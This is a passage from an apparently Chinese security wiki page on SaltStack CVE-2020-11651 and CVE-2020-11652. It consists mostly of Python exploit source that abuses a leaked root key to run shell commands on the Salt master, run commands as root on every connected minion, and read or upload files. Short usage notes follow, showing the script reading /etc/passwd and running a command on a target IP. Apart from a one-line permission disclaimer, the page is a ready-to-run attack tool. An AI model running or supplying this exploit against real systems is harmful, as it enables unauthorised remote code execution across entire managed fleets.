    <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
        <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;runner&#39;</span><span class="p">,</span>
        <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;salt.cmd&#39;</span><span class="p">,</span>
        <span class="s1">&#39;saltenv&#39;</span><span class="p">:</span> <span class="s1">&#39;base&#39;</span><span class="p">,</span>
        <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;sudo_user&#39;</span><span class="p">,</span>
        <span class="s1">&#39;kwarg&#39;</span><span class="p">:</span> <span class="p">{</span>
            <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;cmd.exec_code&#39;</span><span class="p">,</span>
            <span class="s1">&#39;lang&#39;</span><span class="p">:</span> <span class="s1">&#39;python&#39;</span><span class="p">,</span>
            <span class="s1">&#39;code&#39;</span><span class="p">:</span> <span class="s2">&quot;import subprocess;subprocess.call(&#39;</span><span class="si">{}</span><span class="s2">&#39;,shell=True)&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span>
        <span class="p">},</span>
        <span class="s1">&#39;jid&#39;</span><span class="p">:</span> <span class="n">jid</span><span class="p">,</span>
    <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Failed to submit job&#39;</span><span class="p">)</span>
        <span class="k">return</span>

    <span class="k">if</span> <span class="n">rets</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;jid&#39;</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Successfully scheduled job: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">rets</span><span class="p">[</span><span class="s1">&#39;jid&#39;</span><span class="p">]))</span>

<span class="k">def</span><span class="w"> </span><span class="nf">pwn_exec_all</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">cmd</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">,</span> <span class="n">jid</span><span class="p">):</span>
    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[+] Attemping to execute &#39;</span><span class="si">{}</span><span class="s2">&#39; on all minions connected to </span><span class="si">{}</span><span class="s2">&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">,</span> <span class="n">master_ip</span><span class="p">))</span>
    <span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">.</span><span class="n">flush</span><span class="p">()</span>

    <span class="n">msg</span> <span class="o">=</span> <span class="p">{</span>
        <span class="s1">&#39;key&#39;</span><span class="p">:</span> <span class="n">root_key</span><span class="p">,</span>
        <span class="s1">&#39;cmd&#39;</span><span class="p">:</span> <span class="s1">&#39;_send_pub&#39;</span><span class="p">,</span>
        <span class="s1">&#39;fun&#39;</span><span class="p">:</span> <span class="s1">&#39;cmd.run&#39;</span><span class="p">,</span>
        <span class="s1">&#39;user&#39;</span><span class="p">:</span> <span class="s1">&#39;root&#39;</span><span class="p">,</span>
        <span class="s1">&#39;arg&#39;</span><span class="p">:</span> <span class="p">[</span> <span class="s2">&quot;/bin/sh -c &#39;</span><span class="si">{}</span><span class="s2">&#39;&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">],</span>
        <span class="s1">&#39;tgt&#39;</span><span class="p">:</span> <span class="s1">&#39;*&#39;</span><span class="p">,</span>
        <span class="s1">&#39;tgt_type&#39;</span><span class="p">:</span> <span class="s1">&#39;glob&#39;</span><span class="p">,</span>
        <span class="s1">&#39;ret&#39;</span><span class="p">:</span> <span class="s1">&#39;&#39;</span><span class="p">,</span>
        <span class="s1">&#39;jid&#39;</span><span class="p">:</span> <span class="n">jid</span>
    <span class="p">}</span>

    <span class="k">try</span><span class="p">:</span>
        <span class="n">rets</span> <span class="o">=</span> <span class="n">channel</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">msg</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Failed to submit job&#39;</span><span class="p">)</span>
        <span class="k">return</span>
    <span class="k">finally</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">rets</span> <span class="o">==</span> <span class="kc">None</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[+] Successfully submitted job to all minions.&#39;</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Failed to submit job&#39;</span><span class="p">)</span>


<span class="k">def</span><span class="w"> </span><span class="nf">main</span><span class="p">():</span>
    <span class="n">parser</span> <span class="o">=</span> <span class="n">argparse</span><span class="o">.</span><span class="n">ArgumentParser</span><span class="p">(</span><span class="n">description</span><span class="o">=</span><span class="s1">&#39;Saltstack exploit for CVE-2020-11651 and CVE-2020-11652&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--master&#39;</span><span class="p">,</span> <span class="s1">&#39;-m&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;master_ip&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;127.0.0.1&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--port&#39;</span><span class="p">,</span> <span class="s1">&#39;-p&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;master_port&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="s1">&#39;4506&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--force&#39;</span><span class="p">,</span> <span class="s1">&#39;-f&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;force&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_false&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--debug&#39;</span><span class="p">,</span> <span class="s1">&#39;-d&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;debug&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--run-checks&#39;</span><span class="p">,</span> <span class="s1">&#39;-c&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;run_checks&#39;</span><span class="p">,</span> <span class="n">default</span><span class="o">=</span><span class="kc">False</span><span class="p">,</span> <span class="n">action</span><span class="o">=</span><span class="s1">&#39;store_true&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--read&#39;</span><span class="p">,</span> <span class="s1">&#39;-r&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;read_file&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--upload-src&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;upload_src&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--upload-dest&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;upload_dest&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--exec&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;exec&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Run a command on the master&#39;</span><span class="p">)</span>
    <span class="n">parser</span><span class="o">.</span><span class="n">add_argument</span><span class="p">(</span><span class="s1">&#39;--exec-all&#39;</span><span class="p">,</span> <span class="n">dest</span><span class="o">=</span><span class="s1">&#39;exec_all&#39;</span><span class="p">,</span> <span class="n">help</span><span class="o">=</span><span class="s1">&#39;Run a command on all minions&#39;</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="n">parser</span><span class="o">.</span><span class="n">parse_args</span><span class="p">()</span>

    <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] Please only use this script to verify you have correctly patched systems you have permission to access. Hit ^C to abort.&quot;</span><span class="p">)</span>
    <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="c1"># Both src and destination are required for uploads</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">upload_src</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">upload_dest</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">)</span> <span class="ow">or</span> <span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">upload_dest</span> <span class="ow">and</span> <span class="n">args</span><span class="o">.</span><span class="n">upload_src</span> <span class="ow">is</span> <span class="kc">None</span><span class="p">):</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Must provide both --upload-src and --upload-dest&#39;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

    <span class="n">channel</span> <span class="o">=</span> <span class="n">init_minion</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">master_port</span><span class="p">)</span>

    <span class="n">check_connection</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">master_port</span><span class="p">,</span> <span class="n">channel</span><span class="p">)</span>

    <span class="n">root_key</span> <span class="o">=</span> <span class="n">check_CVE_2020_11651</span><span class="p">(</span><span class="n">channel</span><span class="p">)</span>
    <span class="k">if</span> <span class="n">root_key</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[*] root key obtained: </span><span class="si">{}</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">root_key</span><span class="p">))</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Failed to find root key...aborting&#39;</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">127</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">run_checks</span><span class="p">:</span>
        <span class="c1"># Assuming this check runs on the master itself, create a file with &quot;secret&quot; content</span>
        <span class="c1"># and abuse CVE-2020-11652 to read it.</span>
        <span class="n">top_secret_file_path</span> <span class="o">=</span> <span class="s1">&#39;/tmp/salt_cve_teta&#39;</span>
        <span class="k">with</span> <span class="n">salt</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">fopen</span><span class="p">(</span><span class="n">top_secret_file_path</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">fd</span><span class="p">:</span>
            <span class="n">fd</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="s2">&quot;top secret&quot;</span><span class="p">)</span>

        <span class="c1"># Again, this assumes we&#39;re running this check on the master itself</span>
        <span class="k">with</span> <span class="n">salt</span><span class="o">.</span><span class="n">utils</span><span class="o">.</span><span class="n">fopen</span><span class="p">(</span><span class="s1">&#39;/var/cache/salt/master/.root_key&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">keyfd</span><span class="p">:</span>
            <span class="n">root_key</span> <span class="o">=</span> <span class="n">keyfd</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>

        <span class="n">check_CVE_2020_11652_read_token</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">top_secret_file_path</span><span class="p">)</span>
        <span class="n">check_CVE_2020_11652_read</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">top_secret_file_path</span><span class="p">,</span> <span class="n">root_key</span><span class="p">)</span>
        <span class="n">check_CVE_2020_11652_write1</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">)</span>
        <span class="n">check_CVE_2020_11652_write2</span><span class="p">(</span><span class="n">debug</span><span class="p">,</span> <span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">)</span>
        <span class="n">os</span><span class="o">.</span><span class="n">remove</span><span class="p">(</span><span class="n">top_secret_file_path</span><span class="p">)</span>
        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">read_file</span><span class="p">:</span>
        <span class="n">pwn_read_file</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">read_file</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">master_ip</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">upload_src</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">os</span><span class="o">.</span><span class="n">path</span><span class="o">.</span><span class="n">isabs</span><span class="p">(</span><span class="n">args</span><span class="o">.</span><span class="n">upload_dest</span><span class="p">):</span>
            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;[-] Destination path must be relative; aborting&#39;</span><span class="p">)</span>
            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
        <span class="n">pwn_upload_file</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">upload_src</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">upload_dest</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">master_ip</span><span class="p">)</span>


    <span class="n">jid</span> <span class="o">=</span> <span class="s1">&#39;{0:%Y%m</span><span class="si">%d</span><span class="s1">%H%M%S</span><span class="si">%f</span><span class="s1">}&#39;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">datetime</span><span class="o">.</span><span class="n">datetime</span><span class="o">.</span><span class="n">utcnow</span><span class="p">())</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">exec</span><span class="p">:</span>
        <span class="n">pwn_exec</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">exec</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">jid</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">args</span><span class="o">.</span><span class="n">exec_all</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="s2">&quot;[!] Lester, is this what you want? Hit ^C to abort.&quot;</span><span class="p">)</span>
        <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
        <span class="n">pwn_exec_all</span><span class="p">(</span><span class="n">channel</span><span class="p">,</span> <span class="n">root_key</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">exec_all</span><span class="p">,</span> <span class="n">args</span><span class="o">.</span><span class="n">master_ip</span><span class="p">,</span> <span class="n">jid</span><span class="p">)</span>


<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">main</span><span class="p">()</span>
</code></pre></div>
<p>执行命令<code>touch /tmp/awesome_poc</code>：</p>
<div class="highlight"><pre><span></span><code>python CVE-2020-11652.py --master 192.168.174.128 --exec &quot;touch /tmp/awesome_poc&quot;
</code></pre></div>
<p>成功执行命令<code>touch /tmp/awesome_poc</code>：</p>
<p><img alt="image-20220228195913236" src="../images/202202281959477.png" /></p>
<p>读取文件<code>/etc/passwd</code>：</p>
<div class="highlight"><pre><span></span><code>python CVE-2020-11652.py --master 192.168.174.128 -r /etc/passwd
</code></pre></div>
<p>成功读取文件<code>/etc/passwd</code>：</p>
<p><img alt="image-20220228200120557" src="../images/202202282001060.png" /></p>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../SaltStack%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-16846/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../SaltStack%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2020-16846/" class="btn btn-xs btn-link">
        SaltStack 命令注入漏洞 CVE-2020-16846
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../SaltStack%20Minion%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2021-31607/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../SaltStack%20Minion%20%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2021-31607/" class="btn btn-xs btn-link">
        SaltStack Minion 命令注入漏洞 CVE-2021-31607
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>